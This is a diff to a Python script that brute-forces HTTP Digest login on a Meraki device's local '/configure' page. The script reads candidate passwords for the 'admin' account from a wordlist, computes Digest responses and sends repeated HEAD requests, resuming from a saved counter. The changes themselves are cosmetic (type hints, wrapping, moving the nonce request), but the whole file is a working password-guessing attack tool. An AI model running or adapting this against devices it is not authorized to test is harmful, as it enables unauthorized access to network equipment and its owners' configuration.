@@ -4,7 +4,7 @@ import secrets
 
 
 # proud of this one
-def md5(*args):
+def md5(*args) -> str:
     string = ':'.join(str(x) for x in args)
     return hashlib.md5(string.encode()).hexdigest()
 
@@ -20,7 +20,7 @@ def log(request, password, counter):
         exit()
 
 
-def hashes(user, realm, password, method, uri, nonce, cnonce, qop):
+def hashes(user, realm, password, method, uri, nonce, cnonce, qop) -> str:
     h1 = md5(user, realm, password)
     h2 = md5(method, uri)
     response = md5(h1, nonce, '00000001', cnonce, qop, h2)
@@ -36,17 +36,12 @@ def main():
 
     # customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
     user = 'admin'
-    realm = 'Meraki Manual Configuration. The login is \'admin\' and the password has been administratively configured on ' \
-            'Meraki Dashboard. '
+    realm = 'Meraki Manual Configuration. The login is \'admin\' and the password has been administratively ' \
+            'configured on Meraki Dashboard. '
     uri = '/configure'
     method = 'HEAD'
     qop = 'auth'
     filename = '10k.txt'
-
-    # get a new nonce to start the chain
-    # idk how to get this via comprehension, this is a problem with realm and qop too, and leads to the unsightly slicing
-    r = requests.head(url)
-    nonce = r.headers['WWW-Authenticate'][180:-13]
 
     with open(filename) as file:
         passwords = [line.rstrip() for line in file]
@@ -56,11 +51,17 @@ def main():
         print('Total is greater then amount of passwords, please change')
         exit()
 
+    # get a new nonce to start the chain
+    # idk how to get this via comprehension, this is a problem with realm and qop too, and leads to ugly slicing
+    r = requests.head(url)
+    nonce = r.headers['WWW-Authenticate'][180:-13]
+
     for i in range(total, len(passwords)):
         cnonce = secrets.token_hex(8)
         response = hashes(user, realm, passwords[i], method, uri, nonce, cnonce, qop)
         header = {
-            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}", qop=auth, nc="00000001", cnonce="{cnonce}" '
+            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm'
+                             f'=MD5, response="{response}", qop={qop}, nc="00000001", cnonce="{cnonce}" '
         }
         request = requests.head(url, headers=header)
 
